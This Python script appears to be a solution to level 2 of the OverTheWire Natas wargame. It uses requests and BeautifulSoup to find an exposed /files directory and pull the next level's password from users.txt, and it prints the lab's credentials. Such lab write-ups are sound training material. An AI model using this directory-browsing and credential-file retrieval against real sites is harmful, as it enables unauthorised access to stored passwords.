import requests
import bs4
import re


# configuration for natas2
USERNAME = 'natas2'
PASSWORD = 'ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi'
URL = 'http://natas2.natas.labs.overthewire.org'
AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)


response = requests.get(url=URL, auth=AUTH)
soup = bs4.BeautifulSoup(response.text, 'html.parser')
body = soup.find('body')
div_content = body.find('div', {'id' : 'content'})
print(f'{div_content}\n')
# as we can see there is an image, with the src files/pixel.png
# we can check the files directory
image = div_content.find('img', {'src' : 'files/pixel.png'})


response = requests.get(url=URL + '/files', auth=AUTH)
soup = bs4.BeautifulSoup(response.text, 'html.parser')
# there is a link to the file users.txt in the files directory
users = soup.find('a', {'href' : 'users.txt'})
print(f'{users}\n')


# natas3 password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
response = requests.get(url=URL + '/files/users.txt', auth=AUTH)
password = re.search(r'natas3:(\w+)', response.text).group(1)
print(f'natas3 password: {password}')